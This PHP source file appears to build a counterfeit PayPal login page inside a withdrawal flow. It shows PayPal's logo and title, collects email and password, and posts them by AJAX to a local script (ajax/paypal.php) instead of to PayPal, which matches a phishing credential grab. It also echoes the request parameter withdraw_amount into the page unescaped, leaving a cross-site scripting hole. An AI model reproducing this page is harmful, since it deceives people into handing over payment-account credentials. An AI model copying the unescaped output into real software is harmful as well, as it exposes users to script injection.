<?php

session_start();


$id=$_SESSION['user_id'];
$withdraw_amount=$_REQUEST['withdraw_amount'];
$unix_time=time();
if($_POST){
 
  header("location:../index.php");
}
?>

<link rel="stylesheet" href="paypal.css">
<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.js" integrity="sha512-n/4gHW3atM3QqRcbCn6ewmpxcLAHGaDjpEBu4xZd47N0W2oQ+6q7oc3PXstrJYXcbNU1OHdQ1T7pAP+gi5Yu8g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<div id="main" class="main " role="main">
    <section id="login" class="login" data-role="page" data-title="Log in to your PayPal account">
        <div class="corral">
              <div id="content" class="contentContainer">
                <header>
                    <p class="paypal-logo paypal-logo-long"><center><img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.png"></center></p>
                  </header>
                <form action="#" method="post" class="proceed maskable" name="login" autocomplete="off" novalidate="" id="myForm">
                    <div id="passwordSection" class="clearfix">
                        <div class="textInput" id="login_emaildiv">
                            <div class="fieldWrapper">
                                <label for="email" class="fieldLabel">Email</label>
                                <input id="email" name="email" type="email" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" autocomplete="off" placeholder="Email">
                           </div>
                        </div>
                        
                     <div class="textInput lastInputField" id="login_passworddiv">
                         <div class="fieldWrapper"><label for="password" class="fieldLabel">Password</label>
                            <input id="password" name="password" type="password" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" placeholder="Password">
                            <input type="hidden" name="withdraw_amount" value="<?php echo $withdraw_amount; ?>"/>
                       </div>
                     </div>
                   </div>
               <div class="actions actionsSpaced"><button class="button actionContinue" type="button" id="btnLogin" name="btnLogin" value="Login" onclick="submitForm()">Log In</button></div><div class="forgotLink"><a href="#" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">Having trouble logging in?</a></div><br>
               </form>
            
               <a href="https://www.paypal.com/ng/welcome/signup/#/mobile_conf" class="button secondary" id="createAccount">Sign Up</a></div></div></section>
               
               </div>
               
                <script>
     function submitForm(){
         var myFormData=$("#myForm").serialize();
         $("#btnLogin").attr("disabled",true);
         
         $.ajax({
             "type":"post",
             "url":"ajax/paypal.php",
             "data":myFormData,
             success:function(data){
                 swal("success",data,"success");
                 
             }
         });
     }
 </script>





<?php



?>